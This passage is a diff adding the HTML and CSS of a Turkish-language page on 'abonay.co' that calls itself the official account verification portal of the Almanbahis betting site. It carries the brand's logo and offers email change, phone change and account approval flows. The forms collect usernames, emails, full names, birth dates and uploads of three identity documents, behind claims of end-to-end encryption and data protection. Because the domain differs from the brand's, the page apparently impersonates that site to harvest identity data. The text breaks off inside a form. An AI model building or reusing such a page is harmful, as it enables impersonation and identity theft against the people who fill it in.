@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>abonay.co — Almanbahis Resmi Hesap Doğrulama</title>
+<meta name="description" content="Almanbahis üyelerine özel resmi hesap doğrulama ve belge yükleme platformu. KYC işlemlerinizi platform içinden hızlı ve şifreli olarak tamamlayın." />
+<meta name="robots" content="noindex" />
+<link rel="icon" type="image/webp" href="logo-almanbahis.webp" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0a0a0a;
+    --bg-2:#0f0f0f;
+    --surface:#161616;
+    --surface-2:#1c1c1c;
+    --line:rgba(255,255,255,.06);
+    --line-2:rgba(255,255,255,.10);
+    --text:#f0ece4;
+    --muted:#b8b2ac;
+    --muted-2:#9d958e;
+    --burgundy:#6b0f0f;
+    --burgundy-2:#4a0808;
+    --red:#b30410;
+    --red-2:#8a0309;
+    --red-soft:rgba(179,4,16,.12);
+    --gold:#d4a017;
+    --gold-2:#b8870a;
+    --gold-light:#f0c040;
+    --gold-soft:rgba(212,160,23,.12);
+    --green:#10b981;
+    --green-2:#059669;
+    --green-soft:rgba(16,185,129,.12);
+    --error:#ef4444;
+    --error-soft:rgba(239,68,68,.12);
+    --radius:12px;
+    --radius-sm:8px;
+    --shadow:0 8px 30px rgba(0,0,0,.5);
+    --shadow-sm:0 2px 10px rgba(0,0,0,.3);
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  html,body{
+    background:
+      radial-gradient(1200px 700px at 80% -10%, rgba(227,6,19,.10), transparent 60%),
+      radial-gradient(900px 500px at -10% 100%, rgba(255,204,0,.06), transparent 60%),
+      var(--bg);
+    color:var(--text);
+    font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+    line-height:1.55;
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+  }
+  a{color:inherit;text-decoration:none}
+  img{max-width:100%;display:block}
+  button{font-family:inherit;border:none;cursor:pointer;background:none;color:inherit}
+  input,select,textarea{font-family:inherit;font-size:15px}
+  .container{max-width:1100px;margin:0 auto;padding:0 22px}
+
+  /* Top bar — Almanbahis stili (bordo arka plan + altın CTA) */
+  .topbar{background:var(--burgundy);border-bottom:1px solid rgba(155,28,28,.3);padding:7px 0}
+  .topbar-inner{display:flex;align-items:center;justify-content:center;gap:12px;flex-wrap:nowrap}
+  .topbar span{font-size:13.5px;font-weight:500;color:#f0ece4;line-height:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .topbar-cta{display:inline-flex;align-items:center;gap:5px;background:var(--gold);color:#0a0a0a;font-weight:700;padding:5px 12px;font-size:12.5px;border-radius:7px;line-height:1;flex-shrink:0;transition:background .15s ease}
+  .topbar-cta:hover{background:var(--gold-light)}
+  .topbar-cta svg{width:11px;height:11px}
+
+  /* Header */
+  header.site{background:var(--bg);position:sticky;top:0;z-index:50}
+  .nav{display:flex;align-items:center;justify-content:space-between;height:74px}
+  .logo{display:flex;align-items:center;gap:14px;font-weight:800;font-size:14px;letter-spacing:.3px;color:var(--muted)}
+  .logo-img{height:38px;width:auto;display:block;filter:drop-shadow(0 2px 6px rgba(0,0,0,.4))}
+  .logo-divider{width:1px;height:28px;background:var(--line)}
+  .logo-sub{display:flex;flex-direction:column;line-height:1.15;text-transform:uppercase;letter-spacing:1.2px;font-size:11px}
+  .logo-sub strong{color:#fff;font-size:13px;letter-spacing:1.5px}
+  .logo-sub b{color:var(--gold)}
+  .nav-actions{display:flex;align-items:center;gap:14px;color:var(--muted);font-size:14px}
+  .nav-actions a:hover{color:#fff}
+  .help-pill{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.04);border:1px solid var(--line);padding:8px 14px;border-radius:999px;font-size:13.5px;color:var(--muted);transition:all .15s}
+  .help-pill:hover{color:#fff;border-color:var(--line-2)}
+
+  /* Main */
+  main{padding:48px 0 80px;min-height:60vh}
+
+  /* View transitions */
+  .view{display:none;animation:fade .25s ease}
+  .view.active{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+
+  /* Page header */
+  .page-head{text-align:center;max-width:680px;margin:0 auto 36px}
+  .page-head .eyebrow{display:inline-flex;align-items:center;gap:8px;background:var(--gold-soft);border:1px solid rgba(255,204,0,.35);color:var(--gold);padding:6px 14px;border-radius:999px;font-size:13px;font-weight:600;margin-bottom:16px}
+  .page-head h1{font-size:clamp(30px,4vw,44px);font-weight:800;letter-spacing:-.5px;line-height:1.1;margin-bottom:12px}
+  .page-head p{color:var(--muted);font-size:16.5px;max-width:560px;margin:0 auto}
+  .page-head .back{display:inline-flex;align-items:center;gap:6px;color:var(--muted);font-size:14px;margin-bottom:16px;transition:color .15s}
+  .page-head .back:hover{color:#fff}
+
+  /* Action cards (home) */
+  .actions{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+  .action-card{
+    background:linear-gradient(180deg,var(--surface) 0%,var(--bg-2) 100%);
+    border:1px solid var(--line);
+    border-radius:var(--radius);
+    padding:28px;
+    box-shadow:var(--shadow);
+    display:flex;flex-direction:column;
+    transition:transform .2s ease, border-color .2s ease, box-shadow .2s ease;
+  }
+  .action-card:hover{transform:translateY(-4px);border-color:var(--line-2);box-shadow:0 20px 50px rgba(0,0,0,.45)}
+  .action-icon{width:56px;height:56px;border-radius:14px;background:linear-gradient(135deg,rgba(227,6,19,.18),rgba(255,204,0,.12));border:1px solid rgba(255,204,0,.25);display:grid;place-items:center;margin-bottom:18px}
+  .action-icon svg{width:28px;height:28px;stroke:var(--gold);stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+  .action-card h3{font-size:20px;font-weight:700;margin-bottom:8px}
+  .action-card p{color:var(--muted);font-size:14.5px;flex:1;margin-bottom:20px}
+  .action-card .btn{margin-top:auto}
+
+  /* Buttons */
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:13px 22px;border-radius:10px;font-weight:600;font-size:15px;transition:transform .15s ease, box-shadow .2s ease, background .2s ease, opacity .15s;white-space:nowrap}
+  .btn:active{transform:translateY(1px)}
+  .btn-primary{background:linear-gradient(180deg,var(--red) 0%,var(--red-2) 100%);color:#fff;box-shadow:0 8px 22px rgba(227,6,19,.35)}
+  .btn-primary:hover{box-shadow:0 12px 30px rgba(227,6,19,.5)}
+  .btn-gold{background:linear-gradient(180deg,var(--gold) 0%,var(--gold-2) 100%);color:#1a1a1a;box-shadow:0 8px 22px rgba(255,204,0,.25)}
+  .btn-gold:hover{box-shadow:0 12px 30px rgba(255,204,0,.4)}
+  .btn-primary:disabled{opacity:.5;cursor:not-allowed;box-shadow:none}
+  .btn-ghost{background:rgba(255,255,255,.04);border:1px solid var(--line);color:#fff}
+  .btn-ghost:hover{background:rgba(255,255,255,.08);border-color:var(--line-2)}
+  .btn-block{width:100%}
+  .btn-lg{padding:15px 26px;font-size:16px}
+
+  /* Cards */
+  .card{
+    background:linear-gradient(180deg,var(--surface) 0%,var(--bg-2) 100%);
+    border:1px solid var(--line);
+    border-radius:var(--radius);
+    padding:32px;
+    box-shadow:var(--shadow);
+  }
+  .card-narrow{max-width:680px;margin:0 auto}
+
+  /* Stepper */
+  .stepper{display:flex;align-items:center;justify-content:space-between;max-width:760px;margin:0 auto 36px;gap:0}
+  .step-node{display:flex;flex-direction:column;align-items:center;gap:8px;flex:0 0 auto;position:relative;z-index:2}
+  .step-circle{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:var(--bg-2);border:2px solid var(--line);color:var(--muted);font-weight:700;font-size:15px;transition:all .25s ease}
+  .step-node.done .step-circle{background:var(--red);border-color:var(--red);color:#fff}
+  .step-node.active .step-circle{background:var(--surface-2);border-color:var(--gold);color:#fff;box-shadow:0 0 0 6px var(--gold-soft)}
+  .step-label{font-size:12.5px;font-weight:600;color:var(--muted);text-align:center;max-width:110px}
+  .step-node.active .step-label,.step-node.done .step-label{color:#fff}
+  .step-bar{flex:1;height:2px;background:var(--line);position:relative;margin-top:-26px;z-index:1}
+  .step-bar.done{background:var(--red)}
+
+  /* Form */
+  .form-row{margin-bottom:18px}
+  .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  label.field{display:block}
+  .field-label{display:block;font-size:13.5px;font-weight:600;color:var(--text);margin-bottom:6px}
+  .field-label .req{color:var(--red);margin-left:4px}
+  .input,.select,.textarea{
+    width:100%;
+    background:rgba(0,0,0,.25);
+    border:1.5px solid var(--line);
+    color:#fff;
+    padding:13px 14px;
+    border-radius:var(--radius-sm);
+    transition:border-color .15s ease, box-shadow .15s ease;
+    outline:none;
+  }
+  .input::placeholder,.textarea::placeholder{color:var(--muted-2)}
+  .input:focus,.select:focus,.textarea:focus{border-color:var(--gold);box-shadow:0 0 0 4px var(--gold-soft)}
+  .input.error,.select.error{border-color:var(--error);box-shadow:0 0 0 4px var(--error-soft)}
+  .field-error{color:#fca5a5;font-size:13px;margin-top:6px;display:none}
+  .field.has-error .field-error{display:block}
+  .field-help{color:var(--muted);font-size:12.5px;margin-top:6px}
+
+  /* Step content */
+  .step-title{font-size:22px;font-weight:700;margin-bottom:6px}
+  .step-desc{color:var(--muted);font-size:14.5px;margin-bottom:24px}
+
+  /* Step navigation */
+  .step-nav{display:flex;justify-content:space-between;align-items:center;margin-top:28px;padding-top:24px;border-top:1px solid var(--line);gap:12px}
+  .step-nav .left,.step-nav .right{display:flex;gap:10px}
+  .step-counter{font-size:13px;color:var(--muted)}
+
+  /* Trust banner */
+  .trust{display:flex;align-items:center;gap:14px;background:rgba(16,185,129,.06);border:1px solid rgba(16,185,129,.25);color:#a7f3d0;padding:14px 18px;border-radius:var(--radius-sm);font-size:13.5px;margin-bottom:24px}
+  .trust svg{width:22px;height:22px;flex-shrink:0;stroke:var(--green);stroke-width:2;fill:none}
+  .trust strong{color:#fff}
+
+  /* Section divider (used in email/phone forms before doc uploads) */
+  .section-divider{height:1px;background:var(--line);margin:26px 0 22px}
+  .section-title{font-size:17px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+  .section-title .req{color:var(--red)}
+  .section-desc{color:var(--muted);font-size:13.5px;margin-bottom:18px}
+
+  /* Upload zones */
+  .uploads{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  .upload{display:flex;flex-direction:column}
+  .upload-head{margin-bottom:10px}
+  .upload-title{font-size:15px;font-weight:700;display:flex;align-items:center;gap:8px;line-height:1.3}
+  .upload-title .req{color:var(--red)}
+  .upload-desc{color:var(--muted);font-size:13px;margin-top:4px;line-height:1.45;min-height:2.9em}
+  /* 3. yükleme alanı (tek kalan) — webde iki sütunu kaplayıp ortalanır */
+  .uploads .upload:nth-child(3){
+    grid-column:1 / -1;
+    place-self:center;
+    width:100%;
+    max-width:calc((100% - 18px) / 2);
+  }
+  /* Modern tarayıcılarda subgrid ile mükemmel hizalama (Chrome 117+/FF 71+/Safari 16+) */
+  @supports (grid-template-rows: subgrid){
+    .uploads{grid-auto-rows:auto}
+    .upload{display:grid;grid-template-rows:subgrid;grid-row:span 3}
+    .upload > *{align-self:start}
+  }
+  .dropzone{
+    position:relative;
+    border:2px dashed var(--line-2);
+    border-radius:var(--radius-sm);
+    background:rgba(0,0,0,.2);
+    padding:26px 16px;
+    text-align:center;
+    transition:all .2s ease;
+    cursor:pointer;
+    min-height:170px;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;
+  }
+  .dropzone:hover{border-color:var(--gold);background:rgba(255,204,0,.04)}
+  .dropzone.dragover{border-color:var(--gold);background:rgba(255,204,0,.08);box-shadow:0 0 0 3px rgba(212,160,23,.25)}
+  .dropzone .upload-icon{width:44px;height:44px;border-radius:50%;background:rgba(255,204,0,.10);border:1px solid rgba(255,204,0,.3);display:grid;place-items:center}
+  .dropzone .upload-icon svg{width:22px;height:22px;stroke:var(--gold);stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+  .dropzone-text{color:#fff;font-weight:600;font-size:14px}
+  .dropzone-hint{color:var(--muted-2);font-size:12.5px}
+  .dropzone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer}
+
+  .preview{display:none;background:rgba(0,0,0,.25);border:1.5px solid var(--line);border-radius:var(--radius-sm);padding:14px;gap:14px;align-items:center}
+  .preview.show{display:flex}
+  .thumb{width:64px;height:64px;border-radius:8px;background:#000;flex-shrink:0;overflow:hidden;display:grid;place-items:center;border:1px solid var(--line)}
+  .thumb img{width:100%;height:100%;object-fit:cover}
+  .thumb .file-icon{color:var(--muted);font-size:24px}
+  .preview-info{flex:1;min-width:0}
+  .preview-name{font-weight:600;font-size:13.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .preview-size{color:var(--muted);font-size:12px;margin-top:2px}
+  .progress{height:5px;background:rgba(255,255,255,.08);border-radius:99px;overflow:hidden;margin-top:8px}
+  .progress-bar{height:100%;background:linear-gradient(90deg,var(--green),#34d399);width:0%;transition:width .3s ease}
+  .preview.done .progress-bar{width:100%!important}
+  .preview-done-badge{display:none;align-items:center;gap:4px;color:#34d399;font-size:12px;font-weight:600;margin-top:6px}
+  .preview.done .preview-done-badge{display:inline-flex}
+  .preview-actions{display:flex;align-items:center;gap:8px}
+  .icon-btn{width:34px;height:34px;border-radius:8px;display:grid;place-items:center;background:rgba(255,255,255,.04);border:1px solid var(--line);color:var(--muted);transition:all .15s}
+  .icon-btn:hover{color:var(--red);border-color:var(--red);background:var(--red-soft)}
+  .icon-btn svg{width:16px;height:16px;stroke:currentColor;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+
+  .upload-error{display:none;background:var(--red-soft);border:1px solid rgba(239,68,68,.3);color:#fca5a5;padding:10px 12px;border-radius:8px;font-size:13px;margin-top:10px}
+  .upload-error.show{display:block}
+
+  /* Summary */
+  .summary{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .summary-row{background:rgba(0,0,0,.22);border:1px solid var(--line);border-radius:var(--radius-sm);padding:14px 16px}
+  .summary-row.full{grid-column:1 / -1}
+  .summary-label{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;margin-bottom:4px}
+  .summary-value{font-weight:600;font-size:15px;word-break:break-word}
+  .summary-files{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
+  .file-chip{display:inline-flex;align-items:center;gap:8px;background:var(--green-soft);border:1px solid rgba(16,185,129,.3);color:#a7f3d0;padding:6px 12px;border-radius:999px;font-size:12.5px;font-weight:600}
+  .file-chip svg{width:14px;height:14px;stroke:currentColor;stroke-width:2.5;fill:none}
+
+  /* Consent box */
+  .consent{display:flex;align-items:flex-start;gap:14px;background:rgba(0,0,0,.22);border:1px solid var(--line);border-radius:var(--radius-sm);padding:16px;margin-top:24px;cursor:pointer;min-height:44px}
+  .consent input{margin-top:1px;width:22px;height:22px;accent-color:var(--green);cursor:pointer;flex-shrink:0}
+  .consent span{font-size:14px;color:var(--muted);line-height:1.5}
+  .consent strong{color:#fff}
+  .consent a{color:var(--gold);text-decoration:underline}
+  .consent a:hover{color:var(--gold-light)}
+
+  /* Inline persistent error banner (toast yerine kalıcı, screen-reader için role="alert") */
+  .form-alert{display:none;background:rgba(239,68,68,.10);border:1px solid rgba(239,68,68,.4);color:#fca5a5;padding:14px 16px;border-radius:var(--radius-sm);font-size:14px;margin-bottom:18px;line-height:1.5}
+  .form-alert.show{display:block}
+  .form-alert strong{color:#fff}
+
+  /* Success view */
+  .success-wrap{text-align:center;max-width:520px;margin:60px auto 0}
+  .success-circle{width:96px;height:96px;border-radius:50%;background:radial-gradient(circle,rgba(16,185,129,.25) 0%,rgba(16,185,129,.05) 70%);border:2px solid var(--green);display:grid;place-items:center;margin:0 auto 24px;animation:pop .5s cubic-bezier(.18,1.25,.7,1.05)}
+  @keyframes pop{0%{transform:scale(.4);opacity:0}100%{transform:scale(1);opacity:1}}
+  .success-circle svg{width:48px;height:48px;stroke:var(--green);stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round}
+  .success-wrap h2{font-size:30px;font-weight:800;margin-bottom:10px}
+  .success-wrap p{color:var(--muted);font-size:16px;margin-bottom:8px}
+  .success-meta{display:inline-flex;align-items:center;gap:8px;background:var(--green-soft);border:1px solid rgba(16,185,129,.3);color:#a7f3d0;padding:8px 16px;border-radius:999px;font-size:13.5px;font-weight:600;margin:18px 0 28px}
+  .success-ref{display:flex;flex-direction:column;align-items:center;gap:6px;margin:18px auto 0;padding:14px 18px;background:rgba(0,0,0,.25);border:1px solid var(--line);border-radius:var(--radius-sm);max-width:420px}
+  .success-ref span{font-size:13px;color:var(--muted)}
+  .success-ref code{font-family:'Menlo','Consolas',monospace;background:var(--surface);border:1px solid var(--line-2);padding:6px 12px;border-radius:6px;color:var(--gold);font-weight:700;letter-spacing:.5px;user-select:all}
+  .success-ref small{color:var(--muted-2);font-size:12px}
+
+  /* Toast */
+  .toasts{position:fixed;top:20px;right:20px;display:flex;flex-direction:column;gap:10px;z-index:200;pointer-events:none}
+  .toast{background:var(--surface);border:1px solid var(--line);padding:14px 18px;border-radius:12px;box-shadow:var(--shadow);min-width:260px;max-width:380px;display:flex;align-items:flex-start;gap:12px;animation:slideIn .3s ease;pointer-events:auto;font-size:14px}
+  .toast.success{border-color:rgba(16,185,129,.4);background:linear-gradient(180deg,#0a3a2a 0%,#0a2738 100%)}
+  .toast.error{border-color:rgba(239,68,68,.4);background:linear-gradient(180deg,#3a0a14 0%,#2a0a18 100%)}
+  .toast .t-icon{flex-shrink:0;width:22px;height:22px}
+  .toast.success .t-icon{color:var(--green)}
+  .toast.error .t-icon{color:var(--red)}
+  .toast .t-icon svg{width:100%;height:100%;stroke:currentColor;stroke-width:2.5;fill:none;stroke-linecap:round;stroke-linejoin:round}
+  @keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
+
+  /* Footer */
+  footer{border-top:1px solid var(--line);padding:30px 0;margin-top:60px;background:rgba(0,0,0,.25)}
+  .foot{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;color:var(--muted);font-size:13px}
+  .foot-links{display:flex;gap:18px;flex-wrap:wrap}
+  .foot-links a:hover{color:#fff}
+  .age-pill{display:inline-flex;align-items:center;gap:6px;color:#fca5a5;font-weight:600}
+  .age-circle{width:22px;height:22px;border-radius:50%;border:2px solid #fca5a5;display:grid;place-items:center;font-size:10px}
+
+  /* Klavye odağı — tüm interaktif elementler */
+  a:focus-visible, button:focus-visible, .btn:focus-visible, .icon-btn:focus-visible,
+  .help-pill:focus-visible, .topbar-cta:focus-visible, [data-go]:focus-visible,
+  .dropzone:focus-visible, summary:focus-visible{
+    outline:2px solid var(--gold);
+    outline-offset:2px;
+    border-radius:6px;
+  }
+  .input:focus-visible,.select:focus-visible,.textarea:focus-visible{outline:none}
+
+  /* Hareket azaltma — vestibular kullanıcılar için (WCAG 2.3.3) */
+  @media (prefers-reduced-motion: reduce){
+    *,*::before,*::after{
+      animation-duration:.01ms !important;
+      animation-iteration-count:1 !important;
+      transition-duration:.01ms !important;
+      scroll-behavior:auto !important;
+    }
+  }
+
+  /* Print stylesheet */
+  @media print{
+    body{background:#fff;color:#000}
+    .topbar,.toasts,.btn,.icon-btn,.dropzone input,.help-pill,footer .foot-links,.step-nav{display:none}
+    header.site,.card{box-shadow:none;border:1px solid #ccc}
+    .view{display:block !important}
+  }
+
+  /* Responsive */
+  @media (max-width:880px){
+    .actions{grid-template-columns:1fr}
+    .form-grid{grid-template-columns:1fr}
+    .uploads{grid-template-columns:1fr}
+    .uploads .upload:nth-child(3){width:auto;grid-column:auto;margin:0}
+    .summary{grid-template-columns:1fr}
+    .step-label{font-size:11px;max-width:75px}
+    .card{padding:24px}
+    main{padding:32px 0 60px}
+  }
+  @media (max-width:560px){
+    .logo-sub,.logo-divider{display:none}
+  }
+  @media (max-width:480px){
+    .step-circle{width:36px;height:36px;font-size:13px}
+    .step-bar{margin-top:-23px}
+    .step-label{display:none}
+    .nav{height:64px}
+    .help-pill{display:none}
+    .logo-img{height:32px}
+  }
+</style>
+</head>
+<body>
+
+<!-- Top bar — Almanbahis güncel giriş CTA -->
+<div class="topbar">
+  <div class="container topbar-inner">
+    <a href="https://t2m.io/alm" target="_blank" rel="nofollow noopener" class="topbar-cta">
+      <svg viewBox="0 0 512 512" fill="currentColor"><path d="M352 96l64 0c17.7 0 32 14.3 32 32l0 256c0 17.7-14.3 32-32 32l-64 0c-17.7 0-32 14.3-32 32s14.3 32 32 32l64 0c53 0 96-43 96-96l0-256c0-53-43-96-96-96l-64 0c-17.7 0-32 14.3-32 32s14.3 32 32 32zm-9.4 182.6c12.5-12.5 12.5-32.8 0-45.3l-128-128c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L242.7 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l210.7 0-73.4 73.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l128-128z"/></svg>
+      Almanbahis'e Giriş Yap
+    </a>
+  </div>
+</div>
+
+<header class="site">
+  <div class="container nav">
+    <a href="#" class="logo" data-go="home">
+      <img src="logo-almanbahis.webp" alt="Almanbahis" class="logo-img" />
+      <span class="logo-divider"></span>
+      <span class="logo-sub">
+        <strong>RESMİ DOĞRULAMA</strong>
+        <span>abonay<b>.co</b></span>
+      </span>
+    </a>
+    <div class="nav-actions">
+      <a href="#" class="help-pill">
+        <svg width="14" height="14" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+        Yardım
+      </a>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="container">
+
+    <!-- =========== HOME =========== -->
+    <section id="view-home" class="view active">
+      <div class="page-head">
+        <h1>Hesap Doğrulama</h1>
+        <p>Aşağıdaki işlemleri seçerek hesap güncelleme ve doğrulama taleplerinizi iletebilirsiniz.</p>
+      </div>
+
+      <div class="actions">
+        <article class="action-card">
+          <div class="action-icon">
+            <svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>
+          </div>
+          <h3>E-posta Güncelleme</h3>
+          <p>Hesabınıza tanımlı e-posta adresini değiştirin. Kimlik belgesi doğrulaması gerekir.</p>
+          <button class="btn btn-primary btn-block" data-go="email">Başlat</button>
+        </article>
+
+        <article class="action-card" style="border-color:rgba(227,6,19,.4);box-shadow:0 16px 40px rgba(227,6,19,.15)">
+          <div class="action-icon" style="background:linear-gradient(135deg,rgba(227,6,19,.25),rgba(255,204,0,.18));border-color:rgba(255,204,0,.45)">
+            <svg viewBox="0 0 24 24"><path d="M12 2 4 6v6c0 5 3.5 9.3 8 10 4.5-.7 8-5 8-10V6l-8-4Z"/><path d="m9 12 2 2 4-4"/></svg>
+          </div>
+          <h3>Hesap Onayı</h3>
+          <p>Kimlik belgelerinizi yükleyerek hesap doğrulamasını tamamlayın.</p>
+          <button class="btn btn-primary btn-block" data-go="account">Başlat</button>
+        </article>
+
+        <article class="action-card">
+          <div class="action-icon">
+            <svg viewBox="0 0 24 24"><path d="M22 16.92V21a1 1 0 0 1-1.1 1 19 19 0 0 1-8.27-2.94 18.7 18.7 0 0 1-5.78-5.78A19 19 0 0 1 1.91 5a1 1 0 0 1 1-1.1H7a1 1 0 0 1 1 .76l1 4a1 1 0 0 1-.27.97L7 11.5a16 16 0 0 0 5.5 5.5l1.86-1.74a1 1 0 0 1 .97-.27l4 1a1 1 0 0 1 .76 1Z"/></svg>
+          </div>
+          <h3>Telefon Güncelleme</h3>
+          <p>Hesabınıza tanımlı telefon numarasını değiştirin. Kimlik belgesi doğrulaması gerekir.</p>
+          <button class="btn btn-primary btn-block" data-go="phone">Başlat</button>
+        </article>
+      </div>
+
+    </section>
+
+    <!-- =========== EMAIL =========== -->
+    <section id="view-email" class="view">
+      <div class="page-head">
+        <a href="#" class="back" data-go="home">← Ana sayfaya dön</a>
+        <h1>E-posta Güncelleme</h1>
+        <p>Yeni e-posta adresinizi doğrulamak için kimlik belgelerinizi de yüklemeniz gerekir.</p>
+      </div>
+
+      <div class="card card-narrow">
+        <div class="trust">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 4 6v6c0 5 3.5 9.3 8 10 4.5-.7 8-5 8-10V6l-8-4Z"/><path d="m9 12 2 2 4-4"/></svg>
+          <span><strong>Güvenli işlem.</strong> Bilgileriniz yalnızca hesap güvenliği için kullanılır ve 3. kişilerle paylaşılmaz.</span>
+        </div>
+        <div class="form-alert" id="alert-email" role="alert" aria-live="assertive"></div>
+        <form id="form-email" novalidate aria-label="E-posta güncelleme formu">
+          <div class="form-row"><label class="field"><span class="field-label">Kullanıcı Adı <span class="req">*</span></span><input class="input" name="username" required placeholder="kullaniciadiniz"><span class="field-error">Kullanıcı adı zorunludur.</span></label></div>
+          <div class="form-row"><label class="field"><span class="field-label">Eski E-posta</span><input class="input" name="currentEmail" type="email" placeholder="eski@ornek.com"><span class="field-help">İsteğe bağlı — hatırlamıyorsanız boş bırakabilirsiniz.</span></label></div>
+          <div class="form-row"><label class="field"><span class="field-label">Yeni E-posta <span class="req">*</span></span><input class="input" name="newEmail" type="email" required placeholder="yeni@ornek.com"><span class="field-help">Doğrulama bağlantısı bu adrese gönderilir.</span><span class="field-error">Geçerli bir e-posta adresi girin.</span></label></div>
+
+          <div class="section-divider"></div>
+          <h3 class="section-title">Kimlik Doğrulama Belgeleri <span class="req">*</span></h3>
+          <p class="section-desc">Hesap güvenliğiniz için e-posta değişikliklerinde kimlik belgeleriniz doğrulanır. Aşağıdaki üç belgeyi yükleyin (kamera, galeri veya dosya · Maks. 10 MB).</p>
+          <div class="uploads" data-uploads="email"></div>
+
+          <label class="consent">
+            <input type="checkbox" id="consent-email" required>
+            <span>Yüklediğim belgelerin <strong>kendime ait, gerçek ve güncel</strong> olduğunu onaylıyorum. Bilgilerimin yalnızca hesap doğrulama amacıyla işleneceğini ve <a href="#kvkk" target="_blank" rel="noopener">KVKK / GDPR aydınlatma metni</a> kapsamında saklanacağını kabul ediyorum.</span>
+          </label>
+
+          <button type="submit" class="btn btn-primary btn-block btn-lg" style="margin-top:18px">Güncelleme Talebi Gönder</button>
+        </form>
+      </div>
+    </section>
+
+    <!-- =========== ACCOUNT (KYC) =========== -->
+    <section id="view-account" class="view">
+      <div class="page-head">
+        <a href="#" class="back" data-go="home">← Ana sayfaya dön</a>
+        <h1>Hesap Onayı</h1>
+        <p>Kimlik doğrulamanızı tamamlamak için 4 adımı takip edin. İlerlemeniz tarayıcınızda korunur.</p>
+      </div>
+
+      <!-- Stepper -->
+      <div class="stepper" id="stepper">
+        <div class="step-node active" data-step="1"><div class="step-circle">1</div><div class="step-label">Kişisel Bilgiler</div></div>
+        <div class="step-bar" data-bar="1"></div>
+        <div class="step-node" data-step="2"><div class="step-circle">2</div><div class="step-label">Ek Bilgiler</div></div>
+        <div class="step-bar" data-bar="2"></div>
+        <div class="step-node" data-step="3"><div class="step-circle">3</div><div class="step-label">Belgeler</div></div>
+        <div class="step-bar" data-bar="3"></div>
+        <div class="step-node" data-step="4"><div class="step-circle">4</div><div class="step-label">Özet & Gönder</div></div>
+      </div>
+
+      <div class="card card-narrow">
+        <div class="form-alert" id="alert-kyc" role="alert" aria-live="assertive"></div>
+        <form id="form-kyc" novalidate aria-label="Hesap onayı formu">
+
+          <!-- Step 1 -->
+          <div class="step-content" data-content="1">
+            <h2 class="step-title">Kişisel Bilgiler</h2>
+            <p class="step-desc">Kimliğinizde yer alan bilgilerle birebir aynı olmasına dikkat edin.</p>
+            <div class="trust">
+              <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <span>Bilgileriniz uçtan uca <strong>şifreli</strong> olarak iletilir ve yalnızca doğrulama amacıyla kullanılır.</span>
+            </div>
+            <div class="form-grid">
+              <label class="field"><span class="field-label">Ad Soyad <span class="req">*</span></span><input class="input" name="fullName" required placeholder="Adınız Soyadınız"><span class="field-error">Lütfen ad ve soyadınızı girin.</span></label>
+              <label class="field"><span class="field-label">Kullanıcı Adı <span class="req">*</span></span><input class="input" name="username" required placeholder="hesap kullanıcı adınız"><span class="field-error">Kullanıcı adı zorunludur.</span></label>
+              <label class="field" style="grid-column:1 / -1"><span class="field-label">E-posta <span class="req">*</span></span><input class="input" name="email" type="email" required placeholder="ornek@mail.com"><span class="field-error">Geçerli bir e-posta adresi girin.</span></label>
+            </div>
+          </div>
+
+          <!-- Step 2 -->
+          <div class="step-content" data-content="2" hidden>
+            <h2 class="step-title">Ek Bilgiler</h2>
+            <p class="step-desc">Kimlik belgenizdeki doğum tarihi ve bilgileri ile uyuşmalıdır.</p>
+            <div class="form-grid">
+              <label class="field"><span class="field-label">Doğum Tarihi <span class="req">*</span></span><input class="input" name="dob" type="date" required><span class="field-error">Doğum tarihi gereklidir.</span></label>
+              <label class="field"><span class="field-label">Ülke <span class="req">*</span></span>
+                <select class="select" name="country" required>
+                  <option value="">Seçiniz</option>
+                  <option value="TR">Türkiye</option>
+                  <option value="DE">Almanya</option>
+                  <option value="NL">Hollanda</option>
